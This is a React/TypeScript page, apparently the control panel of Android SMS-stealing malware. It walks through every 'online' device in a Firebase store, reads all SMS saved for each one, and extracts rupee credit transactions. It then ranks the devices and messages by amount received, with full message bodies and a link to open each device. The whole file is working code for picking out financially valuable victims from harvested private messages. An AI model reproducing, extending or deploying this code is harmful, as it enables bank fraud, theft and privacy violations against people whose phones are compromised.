import { useState, useEffect } from "react";
import { ref, onValue, set } from "@/lib/rtdbPb";
import { db } from "@/lib/firebase";
import { useFirebaseUsers } from "@/hooks/useFirebaseData";
import { toast } from "sonner";
import { Progress } from "@/components/ui/progress";
import { Loader2, ScanSearch, Clock, ArrowLeft, CheckCircle2, IndianRupee, Eye, MessageSquare, ExternalLink, ArrowUpDown, ArrowDown, ArrowUp, ChevronLeft, ChevronRight, Smartphone, X, Filter, Search } from "lucide-react";
import { useNavigate } from "react-router-dom";
import DeviceDetail from "@/components/DeviceDetail";

const COOLDOWN_MS = 10 * 60 * 1000; // 10 minutes

function formatTimeLeft(ms: number) {
  const m = Math.floor(ms / 60000);
  const s = Math.floor((ms % 60000) / 1000);
  return `${m}m ${s}s`;
}

interface CreditResult {
  deviceId: string;
  deviceName: string;
  smsKey: string;
  body: string;
  sender: string;
  date: number;
  amount: number;
}

import { extractCreditAmount } from "@/lib/smsParser";

const CACHE_KEY = "magic_scan_results";
const CACHE_META_KEY = "magic_scan_meta";

function loadCachedResults(): { results: CreditResult[]; total: number; timestamp: number } | null {
  try {
    const raw = localStorage.getItem(CACHE_KEY);
    const meta = localStorage.getItem(CACHE_META_KEY);
    if (raw && meta) {
      return { results: JSON.parse(raw), ...JSON.parse(meta) };
    }
  } catch {}
  return null;
}

function saveCachedResults(results: CreditResult[], total: number) {
  try {
    localStorage.setItem(CACHE_KEY, JSON.stringify(results));
    localStorage.setItem(CACHE_META_KEY, JSON.stringify({ total, timestamp: Date.now() }));
  } catch {}
}

const MagicScanPage = () => {
  const navigate = useNavigate();
  const { users } = useFirebaseUsers();
  const [running, setRunning] = useState(false);
  const [progress, setProgress] = useState(0);
  const [total, setTotal] = useState(0);
  const [currentDevice, setCurrentDevice] = useState("");
  const [results, setResults] = useState<CreditResult[]>([]);
  const [done, setDone] = useState(false);
  const [lastUsed, setLastUsed] = useState<number | null>(null);
  const [timeLeft, setTimeLeft] = useState(0);
  const [expandedIdx, setExpandedIdx] = useState<string | null>(null);
  const [openDeviceId, setOpenDeviceId] = useState<string | null>(null);
  const [sortBy, setSortBy] = useState<"amount" | "date" | "device">("amount");
  const [sortDir, setSortDir] = useState<"desc" | "asc">("desc");
  const [page, setPage] = useState(1);
  const [selectedDevice, setSelectedDevice] = useState<string | null>(null);
  const [minAmount, setMinAmount] = useState("");
  const [maxAmount, setMaxAmount] = useState("");
  const [searchQuery, setSearchQuery] = useState("");
  const PAGE_SIZE = 20;

  // Load cached results on mount
  useEffect(() => {
    const cached = loadCachedResults();
    if (cached && cached.results.length > 0) {
      setResults(cached.results);
      setTotal(cached.total);
      setDone(true);
    }
  }, []);

  useEffect(() => {
    const timerRef = ref(db, "magic_scan_last_used");
    const unsub = onValue(timerRef, (snap) => {
      setLastUsed(snap.val() || null);
    });
    return () => unsub();
  }, []);

  useEffect(() => {
    if (!lastUsed) { setTimeLeft(0); return; }
    const tick = () => {
      const remaining = COOLDOWN_MS - (Date.now() - lastUsed);
      setTimeLeft(remaining > 0 ? remaining : 0);
    };
    tick();
    const interval = setInterval(tick, 1000);
    return () => clearInterval(interval);
  }, [lastUsed]);

  const isCooldown = timeLeft > 0;

  const onlineDevices = Object.entries(users).filter(
    ([, u]) => u.model && u.model.trim() !== "" && u.status === "online"
  );

  const runScan = async () => {
    if (onlineDevices.length === 0) {
      toast.info("No online devices found");
      return;
    }

    setRunning(true);
    setDone(false);
    setProgress(0);
    setResults([]);
    setTotal(onlineDevices.length);
    setExpandedIdx(null);
    setPage(1);

    const allCredits: CreditResult[] = [];

    for (let i = 0; i < onlineDevices.length; i++) {
      const [id, user] = onlineDevices[i];
      const name = `${user.brand} ${user.model}`;
      setCurrentDevice(name);
      setProgress(i + 1);

      // Fetch all SMS for this device
      const snapshot = await new Promise<any>((resolve) => {
        const smsRef = ref(db, `mess/${id}/smss`);
        onValue(smsRef, (snap) => resolve(snap), { onlyOnce: true });
      });

      if (snapshot.exists()) {
        const data = snapshot.val();
        Object.entries(data).forEach(([key, sms]: [string, any]) => {
          const amount = extractCreditAmount(sms.body || "", sms.sender || "");
          if (amount !== null && amount > 0) {
            allCredits.push({
              deviceId: id,
              deviceName: name,
              smsKey: key,
              body: sms.body || "",
              sender: sms.sender || "",
              date: sms.date || 0,
              amount,
            });
          }
        });
      }

      // Small delay between devices
      await new Promise((r) => setTimeout(r, 200));
    }

    // Sort by highest amount first
    allCredits.sort((a, b) => b.amount - a.amount);

    setResults(allCredits);
    saveCachedResults(allCredits, onlineDevices.length);
    await set(ref(db, "magic_scan_last_used"), Date.now());
    setDone(true);
    setRunning(false);
    toast.success(`Scan done! Found ${allCredits.length} credit message${allCredits.length !== 1 ? "s" : ""}`);
  };

  const progressPercent = total > 0 ? (progress / total) * 100 : 0;

  const formatAmount = (amt: number) => {
    return amt.toLocaleString("en-IN", { maximumFractionDigits: 2 });
  };

  const formatDate = (ts: number) => {
    if (!ts) return "";
    const d = new Date(ts);
    return d.toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "2-digit" }) +
      " " + d.toLocaleTimeString("en-IN", { hour: "2-digit", minute: "2-digit" });
  };

  return (
    <div className="min-h-screen pb-20 bg-background">
      <header className="sticky top-0 z-30 border-b border-border bg-background/70 backdrop-blur-2xl">
        <div className="flex h-14 items-center gap-3 px-5 max-w-5xl mx-auto">
          <button onClick={() => !running && navigate(-1)} className="h-8 w-8 rounded-lg bg-secondary flex items-center justify-center hover:bg-secondary/80 transition-colors">
            <ArrowLeft className="h-4 w-4 text-foreground" />
          </button>
          <div className="flex items-center gap-2">
            <ScanSearch className="h-4 w-4 text-primary" />
            <span className="text-base font-extrabold text-foreground tracking-tight">Magic Scan</span>
          </div>
        </div>
      </header>

      <main className="px-5 py-6 space-y-5 max-w-5xl mx-auto">
        {/* Info card */}
        <div className="rounded-2xl border border-border bg-card p-5 space-y-3">
          <div className="flex items-center gap-2">
            <ScanSearch className="h-5 w-5 text-primary" />
            <h2 className="text-sm font-bold text-foreground">How it works</h2>
          </div>
          <p className="text-xs text-muted-foreground leading-relaxed">
            Scans all <span className="font-semibold text-foreground">online devices</span> one by one, reads their SMS messages, and extracts all <span className="font-semibold text-green">credit/money received</span> transactions. Results are sorted by highest amount first.
          </p>
          <div className="flex items-center gap-2 pt-1 flex-wrap">
            <div className="px-2.5 py-1 rounded-lg bg-secondary text-[11px] font-medium text-muted-foreground">
              {onlineDevices.length} online device{onlineDevices.length !== 1 ? "s" : ""}
            </div>
            <div className="px-2.5 py-1 rounded-lg bg-secondary text-[11px] font-medium text-muted-foreground">
              10min cooldown
            </div>
          </div>
        </div>

        {/* Cooldown warning */}
        {isCooldown && !running && !done && (
          <div className="flex items-center gap-3 p-4 rounded-2xl bg-orange-500/10 border border-orange-500/20">
            <Clock className="h-5 w-5 text-orange-500 shrink-0" />
            <div>
              <p className="text-sm font-semibold text-orange-500">Cooldown Active</p>
              <p className="text-xs text-orange-500/70">Available again in {formatTimeLeft(timeLeft)}</p>
            </div>
          </div>
        )}

        {/* Progress */}
        {running && (
          <div className="rounded-2xl border border-border bg-card p-5 space-y-4">
            <div className="flex items-center gap-2">
              <Loader2 className="h-4 w-4 text-primary animate-spin" />
              <span className="text-sm font-medium text-foreground">Scanning devices...</span>
            </div>
            <div className="space-y-2">
              <div className="flex items-center justify-between text-[11px] text-muted-foreground">
                <span>Scanning: <span className="font-semibold text-foreground">{currentDevice}</span></span>
                <span>{progress} / {total}</span>
              </div>
              <Progress value={progressPercent} className="h-2" />
            </div>
          </div>
        )}

        {/* Results */}
        {done && !running && (
          <div className="space-y-4">
            <div className="rounded-2xl border border-border bg-card p-5 space-y-4">
              <div className="flex items-center gap-2">
                <CheckCircle2 className="h-5 w-5 text-green" />
                <span className="text-sm font-bold text-foreground">Scan Complete</span>
              </div>
              <div className="grid grid-cols-3 gap-3">
                <div className="p-3 rounded-xl bg-secondary text-center">
                  <p className="text-xl font-extrabold text-foreground">{total}</p>
                  <p className="text-[10px] text-muted-foreground">Devices</p>
                </div>
                <div className="p-3 rounded-xl bg-green/10 text-center">
                  <p className="text-xl font-extrabold text-green">{results.length}</p>
                  <p className="text-[10px] text-muted-foreground">Credits</p>
                </div>
                <div className="p-3 rounded-xl bg-primary/10 text-center">
                  <p className="text-xl font-extrabold text-primary">₹{formatAmount(results.reduce((s, r) => s + r.amount, 0))}</p>
                  <p className="text-[10px] text-muted-foreground">Total</p>
                </div>
              </div>
            </div>

            {/* Search bar */}
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              <input
                type="text"
                placeholder="Search sender, message, device..."
                value={searchQuery}
                onChange={(e) => { setSearchQuery(e.target.value); setPage(1); }}
                className="w-full pl-9 pr-9 py-2.5 rounded-xl bg-secondary border border-border text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-primary/40"
              />
              {searchQuery && (
                <button onClick={() => { setSearchQuery(""); setPage(1); }} className="absolute right-3 top-1/2 -translate-y-1/2 h-5 w-5 rounded-md flex items-center justify-center hover:bg-muted transition-colors">
                  <X className="h-3 w-3 text-muted-foreground" />
                </button>
              )}
            </div>

            {results.length > 0 && (() => {
              const q = searchQuery.toLowerCase().trim();
              const searchFiltered = q
                ? results.filter((r) =>
                    r.sender.toLowerCase().includes(q) ||
                    r.body.toLowerCase().includes(q) ||
                    r.deviceName.toLowerCase().includes(q) ||
                    r.amount.toString().includes(q)
                  )
                : results;

              // Build device summaries
              const deviceMap: Record<string, { name: string; total: number; count: number; maxAmount: number }> = {};
              searchFiltered.forEach((r) => {
                if (!deviceMap[r.deviceId]) deviceMap[r.deviceId] = { name: r.deviceName, total: 0, count: 0, maxAmount: 0 };
                deviceMap[r.deviceId].total += r.amount;
                deviceMap[r.deviceId].count++;
                if (r.amount > deviceMap[r.deviceId].maxAmount) deviceMap[r.deviceId].maxAmount = r.amount;
              });
              const deviceList = Object.entries(deviceMap)
                .map(([id, d]) => ({ id, ...d }))
                .sort((a, b) => b.total - a.total);

              // If no device selected, show device cards
              if (!selectedDevice) {
                return (
                  <div className="space-y-3">
                    <p className="text-xs font-bold text-muted-foreground uppercase tracking-wider px-1">
                      Devices with Credits ({deviceList.length})
                    </p>
                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
                      {deviceList.map((dev) => (
                        <button
                          key={dev.id}
                          onClick={() => { setSelectedDevice(dev.id); setPage(1); setExpandedIdx(null); }}
                          className="rounded-2xl border border-border bg-card p-4 text-left hover:border-primary/30 hover:bg-primary/5 transition-all group"
                        >
                          <div className="flex items-center gap-3 mb-3">
                            <div className="h-10 w-10 rounded-xl bg-green/10 flex items-center justify-center shrink-0">
                              <Smartphone className="h-5 w-5 text-green" />
                            </div>
                            <div className="min-w-0 flex-1">
                              <p className="text-sm font-bold text-foreground truncate">{dev.name}</p>
                              <p className="text-[10px] text-muted-foreground font-mono truncate">{dev.id.slice(0, 14)}</p>
                            </div>
                          </div>
                          <div className="flex items-center justify-between">
                            <div>
                              <p className="text-lg font-black text-green">₹{formatAmount(dev.total)}</p>
                              <p className="text-[10px] text-muted-foreground">{dev.count} credit{dev.count !== 1 ? "s" : ""} · max ₹{formatAmount(dev.maxAmount)}</p>
                            </div>
                            <ChevronRight className="h-4 w-4 text-muted-foreground group-hover:text-primary transition-colors" />
                          </div>
                        </button>
                      ))}
                    </div>
                  </div>
                );
              }

              // Device selected — show its credits with filters
              const deviceCredits = searchFiltered.filter((r) => r.deviceId === selectedDevice);
              const devInfo = deviceMap[selectedDevice];

              // Apply amount filter
              let filtered = deviceCredits;
              const minVal = minAmount ? parseFloat(minAmount) : null;
              const maxVal = maxAmount ? parseFloat(maxAmount) : null;
              if (minVal !== null) filtered = filtered.filter((r) => r.amount >= minVal);
              if (maxVal !== null) filtered = filtered.filter((r) => r.amount <= maxVal);

              // Sort
              const sorted = [...filtered].sort((a, b) => {
                let cmp = 0;
                if (sortBy === "amount") cmp = a.amount - b.amount;
                else if (sortBy === "date") cmp = a.date - b.date;
                else cmp = a.deviceName.localeCompare(b.deviceName);
                return sortDir === "desc" ? -cmp : cmp;
              });

              const totalPages = Math.ceil(sorted.length / PAGE_SIZE);
              const paged = sorted.slice((page - 1) * PAGE_SIZE, page * PAGE_SIZE);

              const toggleSort = (field: "amount" | "date") => {
                if (sortBy === field) setSortDir((d) => (d === "desc" ? "asc" : "desc"));
                else { setSortBy(field); setSortDir("desc"); }
                setPage(1);
              };

              const SortIcon = ({ field }: { field: string }) => {
                if (sortBy !== field) return <ArrowUpDown className="h-3 w-3" />;
                return sortDir === "desc" ? <ArrowDown className="h-3 w-3" /> : <ArrowUp className="h-3 w-3" />;
              };

              return (
                <div className="space-y-3">
                  {/* Back to devices + device header */}
                  <div className="rounded-2xl border border-primary/20 bg-card p-4">
                    <div className="flex items-center gap-3">
                      <button
                        onClick={() => { setSelectedDevice(null); setMinAmount(""); setMaxAmount(""); }}
                        className="h-8 w-8 rounded-lg bg-secondary flex items-center justify-center hover:bg-primary/10 transition-colors shrink-0"
                      >
                        <ArrowLeft className="h-4 w-4 text-foreground" />
                      </button>
                      <div className="flex-1 min-w-0">
                        <p className="text-sm font-bold text-foreground truncate">{devInfo?.name}</p>
                        <p className="text-[10px] text-muted-foreground">{deviceCredits.length} credits · Total ₹{formatAmount(devInfo?.total || 0)}</p>
                      </div>
                      <button
                        onClick={() => setOpenDeviceId(selectedDevice)}
                        className="px-3 py-1.5 rounded-lg bg-primary/10 text-[11px] font-bold text-primary hover:bg-primary/20 transition-colors"
                      >
                        Open Device
                      </button>
                    </div>
                  </div>

                  {/* Amount filter */}
                  <div className="flex items-center gap-2 flex-wrap">
                    <Filter className="h-3.5 w-3.5 text-muted-foreground shrink-0" />
                    <input
                      type="number"
                      placeholder="Min ₹"
                      value={minAmount}
                      onChange={(e) => { setMinAmount(e.target.value); setPage(1); }}
                      className="w-24 px-2.5 py-1.5 rounded-lg bg-secondary border border-border text-xs text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-primary/40"
                    />
                    <span className="text-[10px] text-muted-foreground">to</span>
                    <input
                      type="number"
                      placeholder="Max ₹"
                      value={maxAmount}
                      onChange={(e) => { setMaxAmount(e.target.value); setPage(1); }}
                      className="w-24 px-2.5 py-1.5 rounded-lg bg-secondary border border-border text-xs text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-primary/40"
                    />
                    {(minAmount || maxAmount) && (
                      <button onClick={() => { setMinAmount(""); setMaxAmount(""); setPage(1); }} className="h-6 w-6 rounded-md bg-secondary flex items-center justify-center hover:bg-destructive/10 transition-colors">
                        <X className="h-3 w-3 text-muted-foreground" />
                      </button>
                    )}
                    {/* Sort buttons */}
                    {(["amount", "date"] as const).map((key) => (
                      <button
                        key={key}
                        onClick={() => toggleSort(key)}
                        className={`flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-[11px] font-semibold transition-colors ${
                          sortBy === key ? "bg-primary/15 text-primary border border-primary/20" : "bg-secondary text-muted-foreground hover:text-foreground"
                        }`}
                      >
                        {key === "amount" ? "Amount" : "Date"} <SortIcon field={key} />
                      </button>
                    ))}
                    <span className="ml-auto text-[10px] text-muted-foreground">{sorted.length} results</span>
                  </div>

                  {/* Credits list */}
                  <div className="space-y-2">
                    {paged.map((r) => {
                      const uid = `${r.deviceId}-${r.smsKey}`;
                      const isExpanded = expandedIdx === uid;
                      return (
                        <div key={uid} className="rounded-xl border border-border bg-card overflow-hidden">
                          <div
                            className="flex items-center gap-3 p-3 cursor-pointer hover:bg-secondary/50 transition-colors"
                            onClick={() => setExpandedIdx(isExpanded ? null : uid)}
                          >
                            <div className="h-9 w-9 rounded-xl bg-green/10 flex items-center justify-center shrink-0">
                              <IndianRupee className="h-4 w-4 text-green" />
                            </div>
                            <div className="flex-1 min-w-0">
                              <div className="flex items-center justify-between">
                                <p className="text-sm font-bold text-green">₹{formatAmount(r.amount)}</p>
                                <span className="text-[10px] text-muted-foreground">{formatDate(r.date)}</span>
                              </div>
                              <p className="text-[11px] text-muted-foreground truncate">{r.sender}</p>
                            </div>
                            <button
                              onClick={(e) => { e.stopPropagation(); setExpandedIdx(isExpanded ? null : uid); }}
                              className="h-7 w-7 rounded-lg bg-secondary flex items-center justify-center hover:bg-primary/20 transition-colors shrink-0"
                            >
                              <Eye className="h-3.5 w-3.5 text-muted-foreground" />
                            </button>
                          </div>
                          {isExpanded && (
                            <div className="px-3 pb-3 pt-0 border-t border-border">
                              <div className="mt-2 p-3 rounded-lg bg-secondary">
                                <div className="flex items-center gap-1.5 mb-1.5">
                                  <MessageSquare className="h-3 w-3 text-primary" />
                                  <span className="text-[10px] font-semibold text-muted-foreground uppercase">Full Message</span>
                                </div>
                                <p className="text-xs text-foreground leading-relaxed whitespace-pre-wrap break-words">{r.body}</p>
                              </div>
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>

                  {/* Pagination */}
                  {totalPages > 1 && (
                    <div className="flex items-center justify-between pt-2">
                      <button
                        onClick={() => setPage((p) => Math.max(1, p - 1))}
                        disabled={page === 1}
                        className="flex items-center gap-1 px-3 py-2 rounded-xl bg-secondary text-xs font-medium text-muted-foreground hover:text-foreground disabled:opacity-40 transition-colors"
                      >
                        <ChevronLeft className="h-3.5 w-3.5" /> Prev
                      </button>
                      <span className="text-xs text-muted-foreground font-semibold">Page {page} of {totalPages}</span>
                      <button
                        onClick={() => setPage((p) => Math.min(totalPages, p + 1))}
                        disabled={page === totalPages}
                        className="flex items-center gap-1 px-3 py-2 rounded-xl bg-secondary text-xs font-medium text-muted-foreground hover:text-foreground disabled:opacity-40 transition-colors"
                      >
                        Next <ChevronRight className="h-3.5 w-3.5" />
                      </button>
                    </div>
                  )}
                </div>
              );
            })()}
          </div>
        )}

        {/* Action button */}
        {!running && (
          <button
            onClick={runScan}
            disabled={isCooldown}
            className="w-full py-3.5 rounded-xl text-sm font-bold transition-all active:scale-[0.98] disabled:opacity-40 disabled:cursor-not-allowed bg-primary text-primary-foreground hover:bg-primary/90"
          >
            {done ? "Scan Again" : "Start Magic Scan"}
          </button>
        )}
      </main>

      {openDeviceId && users[openDeviceId] && (
        <DeviceDetail id={openDeviceId} user={users[openDeviceId]} onClose={() => setOpenDeviceId(null)} />
      )}
    </div>
  );
};

export default MagicScanPage;
